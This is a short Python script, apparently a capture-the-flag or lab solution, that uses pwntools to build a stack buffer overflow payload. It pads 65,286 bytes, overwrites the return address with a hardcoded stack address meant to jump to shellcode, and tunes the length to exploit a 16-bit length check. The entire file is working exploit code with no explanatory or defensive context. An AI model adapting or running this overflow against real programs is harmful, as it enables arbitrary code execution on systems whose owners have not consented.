import sys
from pwn import *

junk_size = 65282+4

shellcode_address = 0xffffd542

payload = b'A' * junk_size
payload += p32(shellcode_address)

if (len(payload) & 0xffff) > 0x003f:
    payload += b'A' * (len(payload) & 0xffff - len(payload) + 0x10)

args = (str(len(payload))).encode() + b' ' + payload

sys.stdout.buffer.write(args)
